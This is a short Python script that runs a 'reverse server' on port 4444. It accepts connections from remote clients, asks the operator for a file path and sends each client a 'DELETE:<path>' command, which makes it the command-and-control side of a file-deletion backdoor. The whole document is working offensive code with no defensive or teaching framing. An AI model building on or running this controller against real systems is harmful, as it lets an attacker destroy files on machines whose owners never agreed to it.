import socket

HOST = '0.0.0.0'
PORT = 4444


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Reverse server listening on port {PORT}")

    while True:
        conn, addr = server.accept()
        print(f"Connection from {addr}")
        filename = input("Enter file path to delete: ")
        conn.send(f"DELETE:{filename}".encode())
        response = conn.recv(1024).decode()
        print(f"Response: {response}")
        conn.close()


if __name__ == "__main__":
    start_server()